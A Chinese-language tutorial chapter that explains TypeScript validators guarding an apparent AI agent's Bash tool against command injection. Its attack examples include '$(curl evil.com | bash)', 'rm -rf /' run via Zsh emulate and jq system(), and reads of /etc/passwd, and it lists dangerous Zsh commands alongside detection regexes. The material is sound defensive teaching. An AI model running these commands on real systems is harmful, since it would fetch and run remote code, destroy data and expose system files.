# Bash 安全检查

> 🛡️ 24 项安全检查详解 | 防止危险命令执行

---

## 🎯 学习目标

完成本节后，你将理解：
- ✅ 24 项安全检查的用途
- ✅ 每项检查的实现原理
- ✅ 常见攻击手法及防护
- ✅ 安全检查的局限性

---

## 1. 安全检查总览

### 1.1 24 项检查列表

| ID | 检查项 | 检测内容 | 优先级 |
|----|--------|----------|--------|
| 1 | INCOMPLETE_COMMANDS | 不完整命令 | 高 |
| 2 | JQ_SYSTEM_FUNCTION | jq system() 函数 | 高 |
| 3 | JQ_FILE_ARGUMENTS | jq 文件参数 | 中 |
| 4 | OBFUSCATED_FLAGS | 混淆标志 | 中 |
| 5 | SHELL_METACHARACTERS | Shell 元字符 | 高 |
| 6 | DANGEROUS_VARIABLES | 危险变量 | 高 |
| 7 | NEWLINES | 换行注入 | 高 |
| 8 | DANGEROUS_PATTERNS_COMMAND_SUBSTITUTION | 命令替换 | 高 |
| 9 | DANGEROUS_PATTERNS_INPUT_REDIRECTION | 输入重定向 | 高 |
| 10 | DANGEROUS_PATTERNS_OUTPUT_REDIRECTION | 输出重定向 | 高 |
| 11 | IFS_INJECTION | IFS 注入 | 高 |
| 12 | GIT_COMMIT_SUBSTITUTION | Git commit 替换 | 中 |
| 13 | PROC_ENVIRON_ACCESS | /proc 访问 | 高 |
| 14 | MALFORMED_TOKEN_INJECTION | Token 注入 | 高 |
| 15 | BACKSLASH_ESCAPED_WHITESPACE | 反斜杠转义 | 中 |
| 16 | BRACE_EXPANSION | 大括号展开 | 中 |
| 17 | CONTROL_CHARACTERS | 控制字符 | 高 |
| 18 | UNICODE_WHITESPACE | Unicode 空白 | 中 |
| 19 | MID_WORD_HASH | 词中# | 中 |
| 20 | ZSH_DANGEROUS_COMMANDS | Zsh 危险命令 | 高 |
| 21 | BACKSLASH_ESCAPED_OPERATORS | 转义操作符 | 中 |
| 22 | COMMENT_QUOTE_DESYNC | 注释引号失配 | 高 |
| 23 | QUOTED_NEWLINE | 引号内换行 | 高 |

---

## 2. 高风险检查详解

### 2.1 命令替换检测 (ID: 8)

**检测内容**: 检测 `$()`, `${}`, `<()` 等命令替换模式

**攻击示例**:
```bash
# 正常用法
$(ls -la)

# 攻击用法
$(curl evil.com | bash)
${PATH//\/bin/\/evil}
```

**实现**:
```typescript
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /(?:^|[\s;&|])=[a-zA-Z_]/, message: 'Zsh equals expansion' },
]

function validateCommandSubstitution(context): PermissionResult {
  for (const { pattern, message } of COMMAND_SUBSTITUTION_PATTERNS) {
    if (pattern.test(context.unquotedContent)) {
      return {
        behavior: 'ask',
        message: `Command contains dangerous pattern: ${message}`,
      }
    }
  }
  return { behavior: 'passthrough' }
}
```

---

### 2.2 Zsh 危险命令检测 (ID: 20)

**检测内容**: 检测 Zsh 特有的危险命令

**攻击示例**:
```bash
# zmodload - 模块加载（危险网关）
zmodload zsh/system
sysopen -w /etc/passwd

# emulate - 模拟模式（eval 等价）
emulate -c sh 'rm -rf /'

# zpty - 伪终端执行
zpty -t mypty 'evil command'
```

**实现**:
```typescript
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',    // 模块加载
  'emulate',     // 模拟模式
  'sysopen',     // 文件描述符操作
  'sysread',     // 文件描述符读取
  'syswrite',    // 文件描述符写入
  'zpty',        // 伪终端执行
  'ztcp',        // TCP 连接
  'zf_rm',       // 内置 rm
  'zf_mv',       // 内置 mv
  'zf_ln',       // 内置 ln
  'zf_chmod',    // 内置 chmod
  'zf_chown',    // 内置 chown
])

function validateZshDangerousCommands(context): PermissionResult {
  if (ZSH_DANGEROUS_COMMANDS.has(context.baseCommand)) {
    return {
      behavior: 'ask',
      message: `Command uses Zsh dangerous command: ${context.baseCommand}`,
    }
  }
  return { behavior: 'passthrough' }
}
```

---

### 2.3 IFS 注入检测 (ID: 11)

**检测内容**: 检测 IFS (Internal Field Separator) 注入攻击

**攻击示例**:
```bash
# 正常用法
IFS=: read -r a b <<< "x:y"

# 攻击用法
IFS=$'\n'  # 换行作为分隔符
cmd="echo
evil"
$cmd  # 执行两行命令
```

**实现**:
```typescript
function validateIfsInjection(context): PermissionResult {
  // 检测 IFS 赋值
  if (/IFS\s*=/.test(context.originalCommand)) {
    return {
      behavior: 'ask',
      message: 'Command modifies IFS (Internal Field Separator)',
    }
  }
  
  // 检测 ANSI-C quoting 用于 IFS
  if (/\$'[\n\r\t]/.test(context.originalCommand)) {
    return {
      behavior: 'ask',
      message: 'Command uses ANSI-C quoting for special characters',
    }
  }
  
  return { behavior: 'passthrough' }
}
```

---

### 2.4 Heredoc 安全检测

**检测内容**: 检测 heredoc 在命令替换中的安全使用

**安全用法**:
```bash
# 安全的 heredoc（ quoted delimiter）
cat <<'EOF'
safe content
EOF

# 在命令替换中
result=$(cat <<'EOF'
safe content
EOF
)
```

**攻击用法**:
```bash
# 注入命令
$(cat <<'EOF'
evil command
EOF
; rm -rf /)
```

**实现**:
```typescript
function isSafeHeredoc(command: string): boolean {
  // 检查 heredoc 模式
  const heredocPattern = /\$\(cat[ \t]*<<(-?)[ \t]*(?:'+([A-Za-z_]\w*)'+|\\([A-Za-z_]\w*))/g
  
  // 验证闭合分隔符
  // 确保没有注入的命令
  
  // 验证剩余文本安全
  const remaining = stripHeredoc(command)
  if (!/^[a-zA-Z0-9 \t"'.\-/_@=,:+~]*$/.test(remaining)) {
    return false
  }
  
  return true
}
```

---

## 3. 中等风险检查

### 3.1 Git Commit 替换检测 (ID: 12)

**检测内容**: 检测 Git commit 消息中的命令替换

**攻击示例**:
```bash
# 正常用法
git commit -m "fix: bug fix"

# 攻击用法
git commit -m "$(curl evil.com | bash)"
git commit -m 'msg' && evil_command
```

**实现**:
```typescript
function validateGitCommit(context): PermissionResult {
  if (context.baseCommand !== 'git' || !/^git\s+commit\s+/.test(context.originalCommand)) {
    return { behavior: 'passthrough' }
  }
  
  // 检测双引号内的命令替换
  const messageMatch = context.originalCommand.match(
    /^git[ \t]+commit[ \t]+[^;&|`$<>()\n\r]*?-m[ \t]+(["'])([\s\S]*?)\1(.*)$/
  )
  
  if (messageMatch) {
    const [, quote, messageContent, remainder] = messageMatch
    
    if (quote === '"' && /\$\(|`|\$\{/.test(messageContent)) {
      return {
        behavior: 'ask',
        message: 'Git commit message contains command substitution patterns',
      }
    }
    
    // 检查 remainder 中的 Shell 操作符
    if (remainder && /[;|&()`]|\$\(|\$\{/.test(remainder)) {
      return {
        behavior: 'passthrough',  // 交给完整验证链处理
      }
    }
  }
  
  return { behavior: 'passthrough' }
}
```

---

### 3.2 Jq 命令检测 (ID: 2, 3)

**检测内容**: 检测 jq 的 system() 函数和文件参数

**攻击示例**:
```bash
# system() 函数执行任意命令
jq -n 'system("rm -rf /")'

# 文件参数读取任意文件
jq -f evil.jq
jq --rawfile x /etc/passwd
```

**实现**:
```typescript
function validateJqCommand(context): PermissionResult {
  if (context.baseCommand !== 'jq') {
    return { behavior: 'passthrough' }
  }
  
  // 检测 system() 函数
  if (/\bsystem\s*\(/.test(context.originalCommand)) {
    return {
      behavior: 'ask',
      message: 'jq command contains system() function which executes arbitrary commands',
    }
  }
  
  // 检测危险标志
  if (/(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)/.test(context.originalCommand)) {
    return {
      behavior: 'ask',
      message: 'jq command contains dangerous flags that could execute code or read arbitrary files',
    }
  }
  
  return { behavior: 'passthrough' }
}
```

---

## 4. 完整验证流程

### 4.1 验证链

```typescript
async function validateBashCommand(command: string): Promise<PermissionResult> {
  const context = buildValidationContext(command)
  
  // 1. 基础验证
  const emptyResult = validateEmpty(context)
  if (emptyResult.behavior !== 'passthrough') return emptyResult
  
  // 2. 安全检查链（按优先级排序）
  const checks = [
    validateIncompleteCommands,       // ID: 1
    validateJqSystemFunction,         // ID: 2
    validateJqFileArguments,          // ID: 3
    validateShellMetacharacters,      // ID: 5
    validateDangerousVariables,       // ID: 6
    validateCommandSubstitution,      // ID: 8
    validateInputRedirection,         // ID: 9
    validateOutputRedirection,        // ID: 10
    validateIfsInjection,             // ID: 11
    validateGitCommitSubstitution,    // ID: 12
    validateProcEnvironAccess,        // ID: 13
    validateZshDangerousCommands,     // ID: 20
    // ... 共 24 项检查
  ]
  
  for (const check of checks) {
    const result = await check(context)
    if (result.behavior !== 'passthrough') {
      return result  // 短路返回
    }
  }
  
  return { behavior: 'allow' }
}
```

### 4.2 验证上下文

```typescript
type ValidationContext = {
  originalCommand: string      // 原始命令
  baseCommand: string          // 基础命令（第一个词）
  unquotedContent: string      // 未引用内容
  fullyUnquotedContent: string // 完全未引用内容
  treeSitter?: TreeSitterAnalysis | null  // Tree-sitter 分析结果
}
```

---

## 5. 最佳实践

### 5.1 安全配置

```markdown
✅ 应该做:

1. 启用所有安全检查
   - 不要禁用任何检查
   - 保持检查链完整

2. 使用沙箱环境
   - 在容器中运行命令
   - 限制文件系统访问

3. 审计日志
   - 记录所有命令执行
   - 监控异常模式

❌ 不应该做:

1. 跳过安全检查
2. 在 production 使用 bypass 模式
3. 忽视警告信息
```

### 5.2 局限性认知

```markdown
⚠️ 安全检查的局限性:

1. 无法检测所有攻击
   - 新的攻击手法不断出现
   - 检查基于已知模式

2. 可能有误报
   - 合法命令可能被标记
   - 需要人工审查

3. 不能替代沙箱
   - 检查是软件层面
   - 需要硬件/系统层隔离
```

---

## 📚 相关文档

| 文档 | 说明 |
|------|------|
| [35-权限系统.md](./35-权限系统.md) | 三层规则 + 四种模式 |
| [36-执行编排.md](./36-执行编排.md) | 并发/串行分区 |
| [37-核心工具实现.md](./37-核心工具实现.md) | BashTool 实现详解 |
| [61-权限控制.md](./61-权限控制.md) | 权限决策流程 |
| [62-路径验证.md](./62-路径验证.md) | 路径安全检查 |

---

_最后更新：2026-04-02_  
_预计阅读时间：40 分钟_
